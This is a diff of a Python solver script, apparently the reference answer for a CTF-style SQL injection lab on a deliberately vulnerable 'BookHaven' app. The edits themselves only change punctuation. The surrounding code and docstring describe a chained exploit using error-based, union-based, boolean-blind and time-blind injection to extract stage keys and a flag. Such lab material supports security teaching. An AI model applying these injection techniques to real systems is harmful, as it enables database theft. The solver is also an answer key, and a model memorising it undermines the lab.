@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
-"""solvers/f1.py — Task F.1 "Trick Tower Final Exam" (BookHaven) canonical
+"""solvers/f1.py, Task F.1 "Trick Tower Final Exam" (BookHaven) canonical
 exploit.
 
 Four stages, four independent SQLi techniques, genuinely chained: each
 stage's vulnerable query never runs at all until the *previous* stage's
 real key is supplied as that stage's `token` (checked with a safe,
 parameterized lookup in challenges/finals.py's _stage_key()). There is no
-shortcut — the only way to ever learn a stage's key is to run that
+shortcut, the only way to ever learn a stage's key is to run that
 stage's own technique against the real, seeded bookhaven_stage_keys table:
 
   Stage 1 (error-based):   extractvalue() leaks stage 1's key in a DBMS error.
@@ -17,7 +17,7 @@ stage's own technique against the real, seeded bookhaven_stage_keys table:
   Stage 4 (time-blind):    IF(condition, SLEEP(N), 0) timing, walked the
                             same way, recovers the final flag itself.
 
-This is a real, live extraction against the running stack at every stage —
+This is a real, live extraction against the running stack at every stage;
 nothing below is hardcoded except the final assertion against the expected
 flag.
 """
@@ -40,7 +40,7 @@ ASCII_HIGH = 126
 # Same per-row multiplier consideration as p1_5: bookhaven_catalog has 4
 # seeded rows, and the vulnerable WHERE clause is non-sargable (an OR'd
 # IF() defeats any index), so MariaDB evaluates the injected IF() once per
-# row scanned — a "true" answer's real elapsed time is roughly
+# row scanned, a "true" answer's real elapsed time is roughly
 # ROW_COUNT x SLEEP_SECONDS, not 1x. A generous per-row sleep plus a
 # comfortably-separated threshold keeps the oracle unambiguous without
 # needing to hardcode the exact row count.
@@ -92,7 +92,7 @@ def stage2_union_based(stage1_key: str) -> str:
     resp.raise_for_status()
     body = resp.text
     if "token accepted" not in body:
-        raise RuntimeError("stage 2: token was not accepted — stage 1 key wrong?")
+        raise RuntimeError("stage 2: token was not accepted, stage 1 key wrong?")
     # The union'd row renders stage_keys.key_value into the <td> that
     # normally holds a book title.
     import re
@@ -113,7 +113,7 @@ def stage3_oracle(token: str, code: str) -> bool:
     resp.raise_for_status()
     body = resp.text
     if "token accepted" not in body:
-        raise RuntimeError("stage 3: token was not accepted — stage 2 key wrong?")
+        raise RuntimeError("stage 3: token was not accepted, stage 2 key wrong?")
     has_pass = "PASS" in body
     has_fail = "FAIL" in body
     if has_pass == has_fail:
@@ -169,7 +169,7 @@ def stage4_timed(token: str, lookup_id: str) -> float:
     elapsed = time.monotonic() - start
     resp.raise_for_status()
     if "token accepted" not in resp.text:
-        raise RuntimeError("stage 4: token was not accepted — stage 3 key wrong?")
+        raise RuntimeError("stage 4: token was not accepted, stage 3 key wrong?")
     return elapsed
 
 
@@ -225,19 +225,19 @@ def stage4_time_blind(stage3_key: str) -> str:
 def main() -> int:
     print(f"[f1] target: {BASE}/f/bookhaven")
 
-    print("[f1] stage 1 — error-based extraction of stage 1's key")
+    print("[f1] stage 1, error-based extraction of stage 1's key")
     stage1_key = stage1_error_based()
     print(f"  ok: stage 1 key = {stage1_key!r}")
 
-    print("[f1] stage 2 — union-based extraction of stage 2's key")
+    print("[f1] stage 2, union-based extraction of stage 2's key")
     stage2_key = stage2_union_based(stage1_key)
     print(f"  ok: stage 2 key = {stage2_key!r}")
 
-    print("[f1] stage 3 — boolean-blind extraction of stage 3's key")
+    print("[f1] stage 3, boolean-blind extraction of stage 3's key")
     stage3_key = stage3_boolean_blind(stage2_key)
     print(f"  ok: stage 3 key = {stage3_key!r}")
 
-    print("[f1] stage 4 — time-blind extraction of the final flag")
+    print("[f1] stage 4, time-blind extraction of the final flag")
     flag = stage4_time_blind(stage3_key)
     print(f"[f1] recovered flag: {flag!r}")
 
